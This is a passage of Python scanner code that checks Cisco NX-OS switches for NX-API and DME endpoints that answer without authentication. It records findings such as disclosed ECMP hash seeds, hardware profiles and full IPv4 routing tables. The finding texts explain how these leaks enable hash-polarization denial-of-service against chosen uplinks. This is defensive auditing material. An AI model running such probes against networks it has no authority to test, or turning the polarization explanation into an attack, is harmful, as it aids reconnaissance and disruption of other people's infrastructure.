            return exc.code, ""
        except (urllib.error.URLError, OSError):
            return None, ""

    def _dme_get(scheme: str, p: int, path: str) -> tuple:
        url = f"{scheme}://{host}:{p}{path}"
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            if scheme == "https":
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=_SSL_CTX)
                )
            else:
                opener = urllib.request.build_opener(urllib.request.HTTPHandler())
            resp = opener.open(req, timeout=timeout)
            raw = resp.read(262144)
            return resp.status, raw
        except urllib.error.HTTPError as exc:
            return exc.code, b""
        except (urllib.error.URLError, OSError):
            return None, b""

    for scheme, p in [("https", port), ("http", 80)]:
        status, body = _nxapi_post(scheme, p, "show ip load-sharing")
        if status == 200 and body and len(body) > 10:
            tuple_m = re.search(r'(\d)-tuple', body, re.IGNORECASE)
            seed_m = re.search(r'[Ss]eed\s*[=:]\s*(\w+)', body)
            algo_m = re.search(r'(?i)(crc|hash|symmetric|asymmetric|polarization)', body)
            details = []
            if tuple_m:
                details.append(f"tuple-width={tuple_m.group(1)}")
            if seed_m:
                details.append(f"seed={seed_m.group(1)}")
            if algo_m:
                details.append(f"algo={algo_m.group(0).strip()}")
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_ECMP_HASH_CONFIG_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show ip load-sharing' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p} ({len(body)} bytes). "
                    f"ECMP hash configuration disclosed: {'; '.join(details) if details else 'see raw body'}. "
                    "Revealing the 5-tuple vs 3-tuple selection and the per-ASIC seed value "
                    "enables hash polarization attacks: an attacker who knows the seed can "
                    "craft 5-tuples (src-IP, dst-IP, proto, src-port, dst-port) that all "
                    "hash to the same ECMP bucket, concentrating traffic on a single uplink "
                    "and creating a denial-of-service against that path. The seed is the "
                    "secret in the CRC-based hash function; its disclosure collapses the "
                    "hash table's distribution guarantee."
                ),
                "host": host,
                "port": p,
            })

        status, body = _nxapi_post(scheme, p, "show hardware profile status")
        if status == 200 and body and len(body) > 10:
            asic_m = re.search(r'(?i)(ASIC|forwarding|hash|profile)\s*[=:\s]+(\S+)', body)
            asic_info = asic_m.group(0).strip() if asic_m else ""
            findings.append({
                "severity": "MEDIUM",
                "title": "NXOS_HW_PROFILE_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show hardware profile status' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p} ({len(body)} bytes). "
                    f"Hardware forwarding profile disclosed{(': ' + asic_info) if asic_info else ''}. "
                    "Per-ASIC hash algorithm selection (CRC-32, CRC-16, XOR) and TCAM "
                    "partition configuration are exposed: ASIC-specific hash function "
                    "details allow precise polarization attack tuning per forwarding ASIC "
                    "generation (EX, FX, GX). TCAM partition sizes reveal the maximum "
                    "scalable route/host table depth, bounding table-overflow attack "
                    "feasibility."
                ),
                "host": host,
                "port": p,
            })

        status, body = _nxapi_post(scheme, p, "show ip route summary")
        if status == 200 and body and len(body) > 10:
            total_m = re.search(r'[Tt]otal\s+[Rr]outes?\s*[=:]\s*(\d+)', body)
            bgp_m = re.search(r'\bbgp\b[^\d]*(\d+)', body, re.IGNORECASE)
            ospf_m = re.search(r'\bospf\b[^\d]*(\d+)', body, re.IGNORECASE)
            static_m = re.search(r'\bstatic\b[^\d]*(\d+)', body, re.IGNORECASE)
            parts = []
            if total_m:
                parts.append(f"total={total_m.group(1)}")
            if bgp_m:
                parts.append(f"bgp={bgp_m.group(1)}")
            if ospf_m:
                parts.append(f"ospf={ospf_m.group(1)}")
            if static_m:
                parts.append(f"static={static_m.group(1)}")
            findings.append({
                "severity": "HIGH",
                "title": "NXOS_ROUTE_SUMMARY_UNAUTH",
                "detail": (
                    f"NX-API POST /ins 'show ip route summary' returned HTTP 200 "
                    f"unauthenticated on {scheme}:{p} ({len(body)} bytes). "
                    f"Route count per protocol disclosed: {'; '.join(parts) if parts else 'see raw body'}. "
                    "Route table scale reveals network topology scope: BGP prefix count "
                    "indicates internet peering or DC fabric scale; OSPF count indicates "
                    "IGP domain size; static count indicates manual policy paths. "
                    "ECMP path count per prefix (readable via 'show ip route detail') "
                    "maps directly to the hash table bucket width in use. "
                    "Large RIB size (>500K BGP) indicates internet-facing edge role, "
                    "focusing polarization attacks on high-BGP-path prefixes."
                ),
                "host": host,
                "port": p,
            })

        dme_status, dme_body = _dme_get(scheme, p, "/api/mo/sys/uribv4.json")
        if dme_status == 200 and dme_body and len(dme_body) > 20:
            try:
                dme_data = json.loads(dme_body)
                imdata = dme_data.get("imdata", [])
                route_count = len(imdata) if isinstance(imdata, list) else 0
            except (ValueError, KeyError):
                route_count = 0
            nh_count = 0
            try:
                raw_str = dme_body.decode("utf-8", errors="replace")
                nh_count = raw_str.count('"nextHop"') + raw_str.count('"nhAddr"')
            except (AttributeError, UnicodeDecodeError):
                pass
            findings.append({
                "severity": "CRITICAL",
                "title": "NXOS_DME_URIBV4_UNAUTH",
                "detail": (
                    f"DME GET /api/mo/sys/uribv4.json returned HTTP 200 unauthenticated "
                    f"on {scheme}:{p} ({len(dme_body)} bytes, ~{route_count} imdata objects, "
                    f"~{nh_count} next-hop references). "
                    "The NX-OS DME unicast IPv4 RIB MO exposes the full forwarding information "
                    "base as structured JSON: every IPv4 prefix, ECMP next-hop set, "
                    "administrative distance, metric, and VRF assignment readable without "
                    "credentials. "
                    "Next-hop sets map directly to ECMP hash table buckets: combining RIB "
                    "disclosure with 'show ip load-sharing' seed disclosure enables "
                    "deterministic bucket assignment for any crafted 5-tuple, achieving "
                    "controlled traffic polarization against specific uplinks. "
                    "Full RIB also reveals internal addressing, VRF topology, and "
                    "route-policy scope across all routing domains."
                ),
                "host": host,
                "port": p,
            })

    return findings
